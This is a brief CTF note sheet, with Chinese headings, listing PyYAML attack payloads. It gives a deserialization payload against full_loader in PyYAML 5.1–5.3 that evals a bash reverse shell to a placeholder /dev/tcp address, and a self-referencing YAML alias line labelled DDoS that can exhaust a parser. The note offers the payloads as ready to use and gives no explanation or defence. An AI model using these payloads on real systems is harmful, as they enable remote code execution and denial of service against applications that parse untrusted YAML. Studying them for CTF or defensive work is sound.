tags:: CTF/Python

- # payload
	- 针对5.1 ~ 5.3版本的full_loader函数
		- ```yaml
		  !!python/object/new:str
		    args: []
		    state: !!python/tuple
		      - "__import__('os').system('bash -c \"bash -i >& /dev/tcp/ip/port <&1\"')"
		      - !!python/object/new:staticmethod
		        args: []
		        state:
		          update: !!python/name:eval
		          items: !!python/name:list
		  ```
- # DDoS
	- `{a: &b [*b]}`